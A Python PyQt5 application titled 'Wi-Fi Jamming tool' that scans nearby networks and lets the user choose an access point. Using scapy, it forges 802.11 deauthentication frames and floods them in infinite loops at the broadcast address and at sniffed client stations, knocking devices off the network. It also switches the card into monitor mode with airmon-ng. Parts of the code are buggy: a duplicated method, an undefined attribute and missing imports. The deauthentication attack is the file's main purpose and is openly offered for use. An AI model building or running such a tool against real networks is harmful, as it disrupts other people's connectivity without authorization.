import getpass
from PyQt5 import QtCore, QtWidgets
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *
import importlib
import sys,os,time
import socket
import json
import argparse

from pull import PULL

import pywifi

from scapy.all import *
from scapy.layers.dot11 import Dot11Elt, Dot11, Dot11Beacon

if os.geteuid()==0:
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(0.5)
    results = iface.scan_results()

class JAMMER:

    __ACCESSPOINTS = []
    __EXECUTED     = []
    __DECPACKETS   = []

    __BROADCAST    = "ff:ff:ff:ff:ff:ff"

    def __init__(self, x):
        self.aggressive = True
        self.verbose    = True
        self.exceptions = ['00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']

        self.interface  = 'wlan0mon'

        self.channel    = 0
        self.essids     = x[0]
        self.aps        = x[1]
        self.stations   = False
        self.filters    = ['00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']

        self.packets    = 100
        self.delay      = 1
        self.reset      = 1
        self.code       = 7

        self.m = x

    def extract_essid(self, layers):
        retval = ''
        counter = 0

        try:
            while True:
                layer = layers[counter]
                if hasattr(layer, "ID") and layer.ID == 0:
                    retval = layer.info.decode('utf-8')
                    break
                else:
                    counter += 1
        except IndexError:
            pass

        return retval

    def extract_channel(self, layers):
        retval = ''
        counter = 0

        try:
            while True:
                layer = layers[counter]
                if hasattr(layer, "ID") and layer.ID == 3 and layer.len == 1:
                    retval = ord(layer.info)
                    break
                else:
                    counter += 1
        except IndexError:
            pass

        return retval

    def get_ess(self, bss):
        retval = ''

        for ap in self.__ACCESSPOINTS:
            if ap.get('bssid') == bss:
                retval = ap.get('essid')
                break

        return retval

    def get_channel(self, bss):
        retval = 0

        for ap in self.__ACCESSPOINTS:
            if ap.get('bssid') == bss:
                retval = ap.get('channel')

        return retval

    def filter_devices(self, sn, rc):
        retval = {
            'ap': '',
            'sta': '',
        }

        for ap in self.__ACCESSPOINTS:
            if ap.get('bssid') == sn:
                retval['ap'] = sn
                retval['sta'] = rc
            elif ap.get('bssid') == rc:
                retval['ap'] = rc
                retval['sta'] = sn

        return retval

    def aggressive_run(self, ap, sta):
        pkt = self.forge(ap, sta)[0]
       
        self.write(ap, sta)

        while True:
            sendp(
                pkt,
                iface=self.interface,
                count=1,
                inter=0,
                verbose=True
            )

    def aggressive_handler(self, ap, sta):
        if (sta not in self.exceptions) and (self.aggressive):
            t = threading.Thread(target=self.aggressive_run, args=(ap, sta))
            t.daemon = True
            t.start()


    def clarify(self, toappend):
        essid = toappend.get('essid')
        bssid = toappend.get('bssid')

        if self.essids:
            if essid in self.essids:
                if self.aps:
                    if bssid in self.aps:
                        self.__ACCESSPOINTS.append( toappend )
                        self.aggressive_handler(bssid, self.__BROADCAST)
                else:
                    self.__ACCESSPOINTS.append( toappend )
                    self.aggressive_handler(bssid, self.__BROADCAST)
        else:
            if self.aps:
                if bssid in self.aps:
                    self.__ACCESSPOINTS.append( toappend )
                    self.aggressive_handler(bssid, self.__BROADCAST)
            else:
                self.__ACCESSPOINTS.append( toappend )
                self.aggressive_handler(bssid, self.__BROADCAST)

    def invalid(self, sta):
        for exception in self.exceptions:
            if sta.startswith(exception):
                return True

        return False

    def is_valid_sta(self, sta):
        if self.stations:
            if sta in self.stations:
                return True
            else:
                return False
        else:
            return True

    def get_crate(self, ch):
        retval = []

        for connection in self.__DECPACKETS:
            channel = connection.get('channel')

            if channel == ch:
                retval.append(connection)

        return retval

    def forge(self, ap, sta):
        def fpkt(sn, rc):
            pkt = RadioTap() / Dot11(
                type=0,
                subtype=12,
                addr1=rc,
                addr2=sn,
                addr3=sn
                ) / Dot11Deauth(
                reason=self.code
                )
            return pkt

        retval = []

        if sta != self.__BROADCAST:
            retval.append(fpkt(ap, sta))
            retval.append(fpkt(sta, ap))
        else:
            retval.append(fpkt(ap, sta))

        return retval

    def filtertify(self, ap, sta):
        if self.invalid(sta):
            return
        else:
            if ap not in self.filters and sta not in self.filters:
                if self.is_valid_sta(sta):
                    onrun_form = (ap, sta)
                    if onrun_form not in self.__EXECUTED:

                        self.__EXECUTED.append(onrun_form)
                        pkt_form = {
                            'ap': ap,
                            'sta': sta,
                            'channel': self.get_channel(ap),
                        }

                        self.__DECPACKETS.append(pkt_form)

    def injector(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                bssid = pkt.getlayer(Dot11FCS).addr2
            except:
                bssid = pkt.getlayer(Dot11).addr2

            essid = self.extract_essid(pkt.getlayer(Dot11Elt))
            channel = self.extract_channel(pkt.getlayer(Dot11Elt))

            toappend = {
                'essid': essid,
                'bssid': bssid,
                'channel': channel
            }

            if toappend not in self.__ACCESSPOINTS:
                self.clarify(
                    toappend
                )

        else:
            sender = receiver = ""
            if pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
                sender   = pkt.getlayer(Dot11FCS).addr2
                receiver = pkt.getlayer(Dot11FCS).addr1

            elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
                sender   = pkt.getlayer(Dot11).addr2
                receiver = pkt.getlayer(Dot11).addr1

            if sender and receiver:
                result  = self.filter_devices(sender, receiver)

                if result.get('ap') and result.get('sta'):
                    self.filtertify(result.get('ap'), result.get('sta'))

    def write(self, ap, sta):
        if self.verbose:
            pull.print("*",
                "Sent Deauths Count [{count}] Code [{code}] ({sdeveloper}) {sender} <--> ({rdeveloper}) {receiver} ({essid}) [{channel}]".format(
                    count=pull.RED+str(self.packets)+pull.END,
                    code =pull.GREEN+str(self.code)+pull.END,
                    sender=pull.DARKCYAN+ap.upper()+pull.END,
                    receiver=pull.DARKCYAN+sta.upper()+pull.END,
                    sdeveloper=pull.PURPLE+pull.get_mac(ap)+pull.END,
                    rdeveloper=pull.PURPLE+pull.get_mac(sta)+pull.END,
                    essid=pull.YELLOW+self.get_ess(ap)+pull.END,
                    channel=pull.RED+str(self.get_channel(ap))+pull.END
                ),
                pull.YELLOW
            )
        else:
            pull.print("*",
                "Sent Deauths Count [{count}] Code [{code}] {sender} <--> {receiver} ({essid}) [{channel}]".format(
                    count=pull.RED+str(self.packets)+pull.END,
                    code =pull.GREEN+str(self.code)+pull.END,
                    sender=pull.DARKCYAN+ap.upper()+pull.END,
                    receiver=pull.DARKCYAN+sta.upper()+pull.END,
                    essid=pull.YELLOW+self.get_ess(ap)+pull.END,
                    channel=pull.RED+str(self.get_channel(ap))+pull.END
                ),
                pull.YELLOW
            )

    def jammer(self):
        ch=1
        while True:
            ch = ch % 14 + 1
            #subprocess.call(['iwconfig', self.interface, 'channel', str(ch)])
            time.sleep(0.5)

            crate = self.get_crate(ch)

            for connection in crate:
                ap = connection.get( 'ap' )
                sta = connection.get( 'sta' )
                channel = connection.get( 'channel' )

                pkts = self.forge(ap, sta)
                for pkt in pkts:
                    sendp(pkt, iface=self.interface, count=self.packets, inter=self.delay, verbose=False)

                self.write(self.aps,self.sta)

            self.resetter()

            time.sleep(0.5)

    def resetter(self):
        if self.reset:
            if len(self.__EXECUTED) >= self.reset:
                self.__EXECUTED = []
                self.__DECPACKETS = []

    def interfaced(self, iface):
        self.nx=json.dumps(self.m)
        wix= WindowTwo(self.nx)
        def getNICnames():
            ifaces = []
            dev = open('/proc/net/dev', 'r')
            data = dev.read()
            for n in re.findall('[a-zA-Z0-9]+:', data):
                ifaces.append(n.rstrip(":"))
            return ifaces

        def confirmMon(iface):
            co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
            data = co.communicate()[0].decode()
            card = re.findall('Mode:[A-Za-z]+', data)[0]
            if "Monitor" in card:
                return True
            else:
                return False

        if iface:
            ifaces = getNICnames()
            if iface in ifaces:
                if confirmMon(iface):
                    return iface
                else:
                    wix.message(pull.halt("Interface Not In Monitor Mode [%s]" % (pull.RED + iface + pull.END), True, pull.RED))
            else:
                wix.message(pull.halt("Interface Not Found. [%s]" % (pull.RED + iface + pull.END), True, pull.RED))
        else:
            wix.message(pull.halt("Interface Not Provided. Specify an Interface!", True, pull.RED))



class MainWindow(QtWidgets.QWidget):

    switch_window = QtCore.pyqtSignal(str)

    def __init__(self):
        QtWidgets.QWidget.__init__(self)
        self.setGeometry(300,100,800,600)
        self.setWindowTitle('jamming system')
        self.setStyleSheet(' background-color: #06294B')

        layout = QtWidgets.QGridLayout()

        
        hbox = QHBoxLayout()
        self.search = QLineEdit()
        self.search.setPlaceholderText('Search...')
        self.search.setStyleSheet('background-color:#fff; color:#000; height:30px;')

        self.scann = QtWidgets.QPushButton('Refresh')
        self.scann.setStyleSheet('background-color:#fff; height:30px;')
        self.scann.clicked.connect(self.reload)

        hbox.addWidget(self.search)
        hbox.addStretch()
        hbox.addWidget(self.scann)
        layout.addLayout(hbox, 0,0)

        self.row, self.col = 0,0

        self.tableWidget = QTableWidget(len(results), 2)
        self.tableWidget.setRowCount(len(results))

       
    
        self.tableWidget.setStyleSheet('background-color: #fff;')
        self.tableWidget.setHorizontalHeaderLabels(["Wi-Fi details", "BSSID (MAC)"])
        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        for y, data in enumerate(results):
            self.tableWidget.setItem(y,0, QTableWidgetItem(data.ssid))
            self.tableWidget.setItem(y,1, QTableWidgetItem(data.bssid))

        self.search.textChanged.connect(self.findName)
            
        layout.addWidget(self.tableWidget, 1,0)

        self.tableWidget.cellClicked.connect(self.cellClick)

        self.button = QtWidgets.QPushButton('Jamm')
        self.button.setStyleSheet('color:#fff; height:30px; font-size:15px; font-weight:bold')
        self.button.clicked.connect(self.run_selected_test)

        layout.addWidget(self.button, 2,0)
        
        self.setLayout(layout)

    def reload(self):
        importlib.reload(pywifi)
        time.sleep(0.5)

    def findName(self):
        name = self.search.text().lower()
        for row in range(self.tableWidget.rowCount()):
            item = self.tableWidget.item(row, 0)
            # if the search is *not* in the item's text *do not hide* the row
            self.tableWidget.setRowHidden(row, name not in item.text().lower())

    def cellClick(self, row, col):
        self.row = row
        self.col = col

    def run_selected_test(self):
        self.cell = []
        self.cols = 2
        for col in range(self.cols):
            self.cell.append(self.tableWidget.item(self.row, col).text())
        wifi_data =json.dumps(self.cell)
        self.switch(wifi_data)

    def switch(self,wifi_data):
        self.switch_window.emit(wifi_data)




class WindowTwo(QtWidgets.QWidget):

    switch_window = QtCore.pyqtSignal()
    errorSignal = QtCore.pyqtSignal(str) 
    outputSignal = QtCore.pyqtSignal(str)
    

    def __init__(self, wifi_data):
        QtWidgets.QWidget.__init__(self)
        
        self.output = None
        self.error = None
     
        self.setGeometry(300, 100, 800, 600)
        self.setWindowTitle('jamming system')
        self.setStyleSheet(' background-color: #06294B')
        
        self.y = wifi_data
        prime = json.loads(self.y)
        self.initial_Window(wifi_data)
        
       
        
    

    def initial_Window(self, wifi_data):
        
        vbox = QtWidgets.QGridLayout()
       
        data = json.loads(wifi_data)
        self.ch = subprocess.getoutput("nmcli -g chan dev wifi list bssid" + " " + data[1])
        self.rate = subprocess.getoutput("nmcli -g rate dev wifi list bssid" + " " + data[1])
        self.signal = subprocess.getoutput("nmcli -g signal dev wifi list bssid" + " " + data[1])
        self.security = subprocess.getoutput("nmcli -g security dev wifi list bssid" + " " + data[1])
        self.mode = subprocess.getoutput("nmcli -g mode dev wifi list bssid" + " " + data[1])

        self.process = QtCore.QProcess(self)

        self.tableWidget = QTableWidget(6, 2)
        self.tableWidget.setRowCount(7)

        self.tableWidget.setStyleSheet(' background-color: #06294B;color:#fff;font-weight:family; font-size: 20px; ')
        self.tableWidget.setItem.setStyleSheet('font-size: 20px; ')
        self.tableWidget.verticalHeader().setVisible(False)
        self.tableWidget.horizontalHeader().setVisible(False)
        self.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.tableWidget.setItem(0, 0, QTableWidgetItem('Access Point Name'))
        self.tableWidget.setItem(0, 1, QTableWidgetItem(data[0]))
        self.tableWidget.setItem(1, 0, QTableWidgetItem('Mac address'))
        self.tableWidget.setItem(1, 1, QTableWidgetItem(data[1]))
        self.tableWidget.setItem(2, 0, QTableWidgetItem('Channel number'))
        self.tableWidget.setItem(2, 1, QTableWidgetItem(self.ch))
        self.tableWidget.setItem(3, 0, QTableWidgetItem('Bit rate'))
        self.tableWidget.setItem(3, 1, QTableWidgetItem(self.rate))
        self.tableWidget.setItem(4, 0, QTableWidgetItem('Signal strength'))
        self.tableWidget.setItem(4, 1, QTableWidgetItem(self.signal))
        self.tableWidget.setItem(5, 0, QTableWidgetItem('Security'))
        self.tableWidget.setItem(5, 1, QTableWidgetItem(self.security))
        self.tableWidget.setItem(6, 0, QTableWidgetItem('Mode'))
        self.tableWidget.setItem(6, 1, QTableWidgetItem(self.mode))
        
        

        vbox.addWidget(self.tableWidget, 0,0)  
    
        l = QVBoxLayout()
        self.btn = QPushButton("Monitor mode")
        self.btn.pressed.connect(self.monitor_mode)
        self.btn.setStyleSheet('color:#fff; padding-top:10px; padding-bottom:10px; padding-left:30px; padding-right:30px; font-size:15px ')
        self.btnM = QPushButton("Management mode")
        self.btnM.pressed.connect(self.management_mode)
        self.btnM.setStyleSheet('color:#fff; padding-top:10px; padding-bottom:10px; padding-left:30px; padding-right:30px; font-size:15px ')

        self.text = QPlainTextEdit()
        self.text.setStyleSheet(' background-color:black; color:green;font-size:15px')
        self.text.setReadOnly(True)
       
        l.addWidget(self.text)
        vbox.addLayout(l, 3,0)
        
        self.button = QtWidgets.QPushButton('set monitor mode')
        self.button.clicked.connect(self.monitor_mode)
        self.button.setStyleSheet('color:#fff; padding-top:10px; padding-bottom:10px; padding-left:30px; padding-right:30px; font-size:15px ')

        self.mbutton = QtWidgets.QPushButton('return to management mode')
        self.mbutton.clicked.connect(self.management_mode)
        self.mbutton.setStyleSheet('color:#fff; padding-top:10px; padding-bottom:10px; padding-left:30px; padding-right:30px; font-size:15px ')

        self.back = QtWidgets.QPushButton('back')
        self.back.clicked.connect(self.switch)
        self.back.setStyleSheet('color:#fff; padding-top:10px; padding-bottom:10px; padding-left:30px; padding-right:30px; font-size:15px')

        self.btn = QtWidgets.QPushButton('Initiate Jamming')
        self.btn.clicked.connect(self.jamming_function)
        self.btn.setStyleSheet('color:#fff; padding-top:10px; padding-bottom:10px; padding-left:30px; padding-right:30px; font-size:15px')
        self.errorSignal.connect(lambda error: print(error))
        self.outputSignal.connect(lambda output: print(output))
        self.host = socket.gethostname()
        self.take = getpass.getuser()
        self.cwd = os.getcwd()
        self.message(
            "You run as " + self.take + "\nHostname :" + self.host + "\nCurrent Working Directory " + self.cwd + "\n\nTo initiate jamming \nYou must set your interface in  monitor mode \n")
        
        
        
        
        hbox = QHBoxLayout()
        hbox.addWidget(self.back)
        hbox.addStretch()
        hbox.addWidget(self.btn)
        hbox.addStretch()
        
        hbox.addWidget(self.button)
        hbox.addStretch()
        hbox.addWidget(self.mbutton)        
        hbox.addStretch()
        
                        
         # QProcess object for external app
        self.process = QtCore.QProcess(self)
       

        # Just to prevent accidentally running multiple times
        # Disable the button when process starts, and enable it when it finishes
        #self.process.started.connect(lambda: self.btn.setEnabled(False))
        #self.process.finished.connect(lambda: self.btn.setEnabled(True))
        self.process.readyReadStandardError.connect(self.onReadyReadStandardError)
        self.process.readyReadStandardOutput.connect(self.onReadyReadStandardOutput)
        
        vbox.addLayout(hbox, 2,0)
        self.setLayout(vbox)

    def onReadyReadStandardError(self):
        error = self.process.readAllStandardError().data().decode()
        self.text.appendPlainText(error)
        self.errorSignal.emit(error)

    def onReadyReadStandardOutput(self):
        result = self.process.readAllStandardOutput().data().decode()
        self.text.appendPlainText(result)
        self.outputSignal.emit(result)

    

    def run(self, command):
        """Executes a system command."""

        out, err = subprocess.Popen(command, shell=True,    stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        self.output = out
        self.error = err
        self.text.setPlainText((self.output + self.error).decode())
        return self.output + self.error    

    def run(self, command):
        """Executes a system command."""
        # clear previous text
        self.text.clear()
        self.process.start(command)  
        
        
    def message(self, s):
        self.text.clear()
        self.text.appendPlainText(s)


    def jammingmessage(self, s):
        self.text.clear()
        self.text.appendPlainText(s) 
               
        

    def switch(self):
        self.switch_window.emit()
        self.close()

    def monitor_mode(self):
        self.p = QProcess()
        
        self.errorSignal.connect(lambda error: print(error))
        self.outputSignal.connect(lambda output: print(output))
        self.run("airmon-ng start wlan0")
        self.host=socket.gethostname()  
        self.take=getpass.getuser()  
        self.cwd = os.getcwd()         
        self.message("You run as "+self.take+"\nYou Hostname "+self.host+"\nCurrent Working Directory "+self.cwd)
        

    def management_mode(self):
        self.p = QProcess()
        self.errorSignal.connect(lambda error: print(error))
        self.outputSignal.connect(lambda output: print(output))
        
        self.run("airmon-ng stop wlan0mon")
        self.host=socket.gethostname()  
        self.take=getpass.getuser()  
        self.cwd = os.getcwd()         
        self.message("You run as "+self.take+"\nHostname "+self.host+"\nCurrent Working Directory "+self.cwd)

    def engage(self):
        x = json.loads(self.y)
        inw=json.dumps(self.y)

        job=JAMMER(x)
        job.interfaced(job.interface)
        t=threading.Thread(target=job.jammer)
        t.daemon = True
        t.start()

 
        sniff(iface=job.interface, prn=job.injector, store=0)


    def jamming_function(self):
        
        x = json.loads(self.y)
        #source_essid = str(x[0])
        self.engage()

    

    
    
        
        

 

class Login(QtWidgets.QWidget):    
    

    def __init__(self):
        QtWidgets.QWidget.__init__(self)
        self.setWindowTitle('wifi jamming tool')
        self.setGeometry(500,100,400,600)
        self.setStyleSheet(' background-color: #06294B; color:#fff; font-size:15px')

        flag = QtCore.Qt.WindowFlags(QtCore.Qt.FramelessWindowHint)
        self.setWindowFlags(flag)

        self.picture = QLabel(self)
        self.picture.setPixmap(QPixmap('no-wifi.png'))
        self.picture.setStyleSheet('margin-top:40px; margin-left:70px;')

        self.name = QLabel(self)
        self.name.setText('( wjt )')
        self.name.setStyleSheet('color:#fff; margin-top:360px; margin-left:160px; font-size:20px; font-weight:bold')

        self.text = QLabel(self)
        self.text.setText('Wi-Fi Jamming tool')
        self.text.setStyleSheet('color:#fff; margin-top:390px; margin-left:70px; font-size:25px; font-weight:bold;')

        self.progressBar = QProgressBar(self)
        self.progressBar.setStyleSheet(' width:350px; margin-top:450px; margin-left:25px; height:15px;')
        
        self.btnStart = QPushButton('Scan',self)
        self.btnStart.setStyleSheet('padding:5px; background-color:#fff; color:#000; width:100px; height:20px; margin-left:150px;margin-top:500px ')
        self.btnStart.clicked.connect(self.startProgress)

        self.timer =QBasicTimer()
        self.step = 0

    def infoDialog(self):
        msgBox = QMessageBox()
        msgBox.setIcon(QMessageBox.Warning)
        msgBox.setText("No wi-fi available ...")
        msgBox.setWindowTitle(" Wi-Fi Jamming ")
        #msgBox.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
        msgBox.setStandardButtons(QMessageBox.Ok)
        msgBox.setStyleSheet("padding-left:25px; padding-right:25px; padding-top:10px; padding-bottom:10px; font-size:15px")
        msgBox.move(550,300)

        returnValue = msgBox.exec()
        if returnValue == QMessageBox.Ok:
            sys.exit()
      
        

    switch_window = QtCore.pyqtSignal()

    def startProgress(self):
        if self.timer.isActive():
            self.timer.stop()
            self.btnStart.setText('Start')
        else:
            self.timer.start(100,self)
            self.btnStart.setText('Stop')

    def timerEvent(self,event): 
        if self.step >=100:
            self.timer.stop()
                        
            if not results:
                self.infoDialog()
            else:
                self.btnStart.setText('continue')
                self.btnStart.clicked.connect(self.login)
            return
        self.step = self.step + 1
        self.progressBar.setValue(self.step)

    def login(self):
        self.switch_window.emit()





class Controller:

    def __init__(self):
        pass

    def show_login(self):
        self.login = Login()
        self.login.switch_window.connect(self.show_main)
        self.login.show()

    def show_main(self):
        self.window = MainWindow()
        self.window.switch_window.connect(self.show_window_two)
        self.login.close()
        self.window.show()

    def show_window_two(self, wifi_data):
        self.window_two = WindowTwo(wifi_data)
        self.window_two.switch_window.connect(self.show_main)
        self.window.close()
        self.window_two.show()
        
        

def main():
    if os.geteuid()==0:
        app = QtWidgets.QApplication(sys.argv)
        controller = Controller()
        controller.show_login()
        sys.exit(app.exec_())
        
        
    else:
        pull.print("-",pull.RED +"You must run this tool as root user",pull.END)


if __name__ == '__main__':
        pull = PULL()
        main()
    
